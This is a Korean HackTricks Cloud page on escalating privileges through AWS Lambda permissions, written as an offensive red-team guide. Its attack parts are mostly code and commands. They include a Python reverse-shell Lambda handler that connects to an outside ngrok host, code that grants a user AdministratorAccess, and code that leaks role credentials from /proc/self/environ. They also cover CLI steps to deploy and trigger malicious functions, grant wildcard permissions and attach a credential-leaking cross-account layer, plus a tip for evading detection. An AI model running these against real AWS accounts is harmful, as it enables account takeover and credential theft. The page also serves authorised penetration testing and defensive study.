# AWS - Lambda 권한 상승

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>을 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## lambda

Lambda에 대한 자세한 정보는 다음에서 확인할 수 있습니다:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`, 그리고 `lambda:InvokeFunction`** 권한을 가진 사용자는 권한을 상승시킬 수 있습니다.\
이들은 **기존 IAM 역할에 새로운 Lambda 함수를 생성하고 할당**하여 해당 역할과 관련된 권한을 함수에 부여할 수 있습니다. 사용자는 이후에 **이 Lambda 함수에 코드를 작성하고 업로드**할 수 있습니다(예: 역쉘).\
함수가 설정되면 사용자는 AWS API를 통해 Lambda 함수를 호출하여 의도한 작업을 **트리거**할 수 있습니다. 이 접근 방식은 사용자가 Lambda 함수를 통해 간접적으로 작업을 수행하고, 해당 함수와 관련된 IAM 역할에 부여된 액세스 수준으로 작동할 수 있도록 합니다.\

공격자는 이를 악용하여 **역쉘을 얻고 토큰을 도난**할 수 있습니다:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
당신은 람다 함수 자체에서 람다 역할 권한을 **남용**할 수도 있습니다.\
람다 역할에 충분한 권한이 있다면, 그것을 사용하여 관리자 권한을 부여할 수 있습니다:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
람다의 역할 자격 증명을 외부 연결 없이 누출시키는 것도 가능합니다. 이는 내부 작업에 사용되는 **네트워크 격리된 람다**에 유용합니다. 만약 알 수 없는 보안 그룹이 역쉘을 필터링하는 경우, 이 코드 조각을 사용하여 람다의 출력으로 자격 증명을 직접 누출시킬 수 있습니다.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**잠재적인 영향:** 지정된 임의의 람다 서비스 역할로의 직접 권한 상승.

{% hint style="danger" %}
`lambda:InvokeAsync`가 흥미로워 보일지라도, **`aws lambda invoke-async`를 실행하는 것은 불가능**합니다. `lambda:InvokeFunction`도 필요합니다.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

이전 시나리오와 마찬가지로, **`lambda:AddPermission`** 권한이 있다면 **`lambda:InvokeFunction` 권한을 부여**할 수 있습니다.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**잠재적인 영향:** 지정된 임의의 람다 서비스 역할로의 직접 권한 상승.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction`, 그리고 `lambda:CreateEventSourceMapping`** 권한을 가진 사용자는 `lambda:InvokeFunction` 없이도 간접적으로 권한을 상승시킬 수 있습니다.\
그들은 악성 코드를 가진 Lambda 함수를 생성하고 기존 IAM 역할에 할당할 수 있습니다.

람다를 직접 호출하는 대신, 사용자는 기존의 DynamoDB 테이블을 설정하거나 활용하여 이를 이벤트 소스 매핑을 통해 람다와 연결합니다. 이 설정은 테이블에 새로운 항목이 사용자의 작업이나 다른 프로세스에 의해 입력될 때 자동으로 람다 함수가 트리거되어 간접적으로 람다 함수를 호출하고 전달된 IAM 역할의 권한으로 코드를 실행합니다.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
만약 DynamoDB가 이미 AWS 환경에서 활성화되어 있다면, 사용자는 Lambda 함수를 위한 이벤트 소스 매핑을 설정하기만 하면 됩니다. 그러나 DynamoDB가 사용되지 않는 경우, 사용자는 스트리밍이 활성화된 새로운 테이블을 생성해야 합니다:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
이제 **이벤트 소스 매핑을 생성하여 Lambda 함수를 DynamoDB 테이블에 연결**할 수 있습니다:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda 함수가 DynamoDB 스트림에 연결되어 있으면, 공격자는 DynamoDB 스트림을 활성화함으로써 Lambda를 **간접적으로 트리거**할 수 있습니다. 이는 DynamoDB 테이블에 **아이템을 삽입**함으로써 수행할 수 있습니다:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**잠재적 영향:** 지정된 람다 서비스 역할로의 직접 권한 상승.

### `lambda:AddPermission`

이 권한을 가진 공격자는 **자신 또는 다른 사람에게 어떤 권한이든 부여**할 수 있습니다 (이는 리소스 기반 정책을 생성하여 리소스에 대한 액세스 권한을 부여합니다):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**잠재적인 영향:** 코드를 수정하고 실행할 수 있는 권한을 부여함으로써 람다 서비스 역할에 대한 직접적인 권한 상승이 가능합니다.

### `lambda:AddLayerVersionPermission`

이 권한을 가진 공격자는 **자신 또는 다른 사람에게 `lambda:GetLayerVersion` 권한을 부여**할 수 있습니다. 그는 레이어에 접근하여 취약점이나 민감한 정보를 탐색할 수 있습니다.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**잠재적인 영향:** 민감한 정보에 대한 접근 가능성.

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** 권한을 가진 사용자는 **IAM 역할에 연결된 기존 Lambda 함수의 코드를 수정할 수 있는 잠재력**을 가지고 있습니다.\
공격자는 **IAM 자격 증명을 유출하기 위해 람다의 코드를 수정**할 수 있습니다.

공격자는 직접 함수를 호출할 수 있는 능력을 갖고 있지 않을 수 있지만, Lambda 함수가 이미 존재하고 작동 중인 경우, 기존의 워크플로우나 이벤트를 통해 트리거될 가능성이 높으므로 수정된 코드의 실행이 간접적으로 용이해집니다.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**잠재적 영향:** 사용되는 람다 서비스 역할로의 직접적인 권한 상승.

### `lambda:UpdateFunctionConfiguration`

#### 소개

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html)는 람다 함수에 **코드를 포함**하지만 **별도로 저장**하여 함수 코드를 작게 유지하고 **여러 함수가 코드를 공유**할 수 있도록 합니다.

람다 내에서는 다음과 같은 함수로 python 코드가 로드되는 경로를 확인할 수 있습니다:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
다음은 위치입니다:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

예를 들어, 라이브러리 boto3는 `/var/runtime/boto3` (4번째 위치)에서 로드됩니다.

#### Exploitation

**함수에 레이어를 첨부**하는 것은 `lambda:UpdateFunctionConfiguration` 권한만 필요하며, **레이어는 계정간에 공유될 수 있습니다**. 또한, **사용하는 라이브러리를 알아야** 제대로 덮어쓸 수 있지만, 이 예제에서는 공격 대상 함수가 boto3를 가져오고 있다고 가정합니다.

안전을 위해, 우리는 Lambda 런타임에서 타겟 함수에 문제가 발생할 수 있는 다른 것이 없도록 boto3 라이브러리의 동일한 버전을 설치하기 위해 Pip를 사용할 것입니다. 현재 런타임은 boto3 버전 1.9.42를 사용합니다.

다음 코드로, 우리는 boto3 버전 1.9.42와 해당 종속성을 로컬 "lambda\_layer" 폴더에 설치할 것입니다:
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
다음으로, `/lambda_layer/boto3/__init__.py` 파일을 열고 악성 코드를 추가합니다. 추가할 페이로드는 다음과 같습니다:

![](<../../../.gitbook/assets/image (26).png>)

`requests`는 `botocore`에서 가져옵니다. 이 함수는 환경 변수를 유출하며, try-except 및 0.1 타임아웃은 이 코드가 아무 문제 없이 작동하도록 보장하기 위해 있습니다.

{% hint style="info" %}
**중요한 참고 사항:** 실제 펜테스트에서는 더 이상 `from botocore.vendored import requests`를 사용하지 않아야 합니다. 왜냐하면 해당 함수의 CloudWatch 로그에 "DeprecationWarning"이 출력되어 방어자에게 들킬 가능성이 높아지기 때문입니다.
{% endhint %}

이제 해당 코드를 **ZIP 파일**로 번들링하고, **공격자 계정의 새로운 Lambda 레이어에 업로드**합니다. 먼저 "python" 폴더를 생성하고 라이브러리를 그 안에 넣어야 합니다. 이렇게 하면 Lambda에 업로드할 때 코드가 " /opt/python/boto3"에서 찾을 수 있습니다. 또한, 레이어가 Python 3.7과 호환되며, **레이어가 대상 함수와 동일한 지역에 있는지 확인**해야 합니다. 이 작업이 완료되면, `lambda:AddLayerVersionPermission`을 사용하여 **레이어를 공개적으로 접근 가능하게** 만들어 대상 계정에서 사용할 수 있도록 합니다. 이 API 호출에는 개인 AWS 자격 증명을 사용하세요.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
이제 가로챈 자격 증명을 사용하여 대상 Lambda 함수 "s3-getter"에서 다음 명령을 실행합니다. 이 명령은 **다른 계정의 Lambda 레이어를 연결**합니다.
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
다음 단계는 우리가 할 수 있다면 **함수를 호출**하거나 정상적인 방법으로 **호출되기를 기다리는 것**입니다 - 이것이 더 안전한 방법입니다.

**이 취약점을 악용하는 더 은밀한 방법**은 다음에서 찾을 수 있습니다:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**잠재적인 영향:** 사용된 람다 서비스 역할로의 직접 권한 상승.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

이러한 권한으로 함수를 생성하고 URL을 호출하여 실행할 수 있을 수도 있습니다... 하지만 제가 테스트할 방법을 찾지 못했으므로, 가능하다면 알려주세요!

### Lambda MitM

일부 람다는 **사용자로부터 매개변수로 민감한 정보를 받을 것입니다.** 하나의 람다에서 RCE를 얻으면, 다른 사용자가 보내는 정보를 유출할 수 있습니다. 다음에서 확인하세요:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## 참고 자료

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사를 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>
